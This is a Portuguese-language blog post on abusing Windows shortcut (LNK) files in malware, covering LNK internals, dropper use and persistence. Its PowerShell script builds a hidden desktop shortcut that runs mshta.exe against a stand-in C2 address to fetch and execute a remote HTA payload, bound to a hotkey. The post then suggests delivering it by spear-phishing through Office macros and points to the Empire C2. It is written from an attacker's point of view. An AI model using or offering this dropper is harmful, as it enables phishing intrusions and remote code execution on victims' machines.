---
title: 'O uso de LNK em malwares'
layout: post
---

![image](https://hackmd.io/_uploads/H1hVX1MNyx.png)

O uso de Shortcuts em malwares
===

[toc]

# Introdução
Resolvi escrever este artigo pra abordar o uso de shortcuts do windows (LNK, URL, CDA, PIF, etc..) porque isso tá em alta ultimamente, o uso de shortcuts como dropper em phishings tem sido usado por diversos APTs (Vedalia, Fireant, APT37, APT-C-53, etc..) e é algo simples.

Você pode usar um shortcut pra persistência e acesso inicial, no caso vou abordar os 2.
## Shortcuts
Os Windows shortcuts files foram trazidos no win95, o windows utiliza `.lnk` como nome de extensão pra shortcuts de arquivos locais e `.url` para shortcuts de arquivos remotos (ex: paginas da web).

> Os icones dos shortcuts são assim:
> ![image](https://hackmd.io/_uploads/rk4f2kfN1l.png)
O icone é assim mas voce pode tirar essa setinha apagando a key `IsShortcut` no `HKEY_CLASSES_ROOT\lnkfile` no Registry do windows *(aviso: faça por sua conta em risco, pode ter a chance de dar um problema apos isso)*
## Estrutura do LNK
A estrutura do LNK é a seguinte:
1. `SHELL_LINK_HEADER` - Essa é uma estrutura obrigatória que contém informações e flags necessárias pro resto das estruturas do LNK.
2. `LINKTARGET_IDLIST` - Especifica o alvo do shortcut (o que vai ser linkado ao shortcut) passando na estrutura `ItemID`.
3. `LINKINFO` - Informações sobre a localização do alvo do shortcut.
4. `STRING_DATA` - Tem informações de paths do shortcut. As estruturas da `STRING_DATA` em sua maioria são opcionais, a maioria só vai ser definida se estiver no `LinkFlags` do `MS-SHLLINK`/`ShellLinkHeader`. (**Preste atenção nessas estruturas, elas podem revelar sua operação maliciosa**):
    - `RELATIVE_PATH`: arquivo embedaddo no LNK.
    - `WORKING_DIR`: diretorio onde o arquivo embedaddo no LNK se encontra.
    - `COMMAND_LINE_ARGUMENTS`: argumentos passados pra executar o binario.
5. `EXTRA_DATA` - Informações extras pro LNK.
# Dropper
Um dropper é um snippet pra carregar um malware (na maioria das vezes packed), por exemplo pra mitigar detecção por XDR/EPP. O dropper é utilizado mais por questão de OPSEC mesmo.
## Usando LNK como dropper
Você pode simplesmente embeddar um LOLBINs (sla, invoca o `mshta` pra executar teu payload ou o `regsrv32`, seja criativo) ao teu LNK e (colocando o path no `Target` nas Propriedades do shortcut) e se tu quiser (opcional) setupar uma tecla pra triggar esse LNK e executar teu comando do LOLBIN.

Ou tu pode criar um COM pra criar um LNK pra você.
### Criando um LNK via COM com PS1
```powershell
$path                      = "$([Environment]::GetFolderPath('Desktop'))\DROPPER.lnk"       # path do lnk
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)
$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"   # ICONE
$shortcut.TargetPath       = "mshta.exe"
$shortcut.Arguments        = "http://meu-c2.com/foda.hta"   # mshta.exe http://meu-c2.com/foda.hta
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+Z" # TECLA PRA ATIVAR O LNK, OPCIONAL
$shortcut.Description      = "shortcut" # OPCIONAL DESCRICAO DO SHORTCUT
$shortcut.WindowStyle      = 7
$shortcut.Save()
(Get-Item $path).Attributes += 'Hidden'
```
Pronto, agora você criou um LNK via COM com powershell scripting, mas poderia ter usado qualquer outra lang de scripting como C#, Python e VBScript, qualquer lang q consiga criar COM.
### Acesso inicial
Com esse LNK, voce pode sair fazendo spear-phishing embeddando ele a uma macro do Office. Um C2 que mexe muito bem com LNK é o [Empire](https://github.com/BC-SECURITY/Empire).
Essa técnica não é a melhor em questão de OPSEC (aliás, está bem longe kkkkkkkk) mas é bem interessante.
## Usando LNK como persistência
É o mesmo sentido, ou você roda um módulo qualquer do Empire ou você cria um LNK e seta uma tecla q vc ache q o alvo vai usar com frequencia ou não (ideias: F11, Shift, etc...)
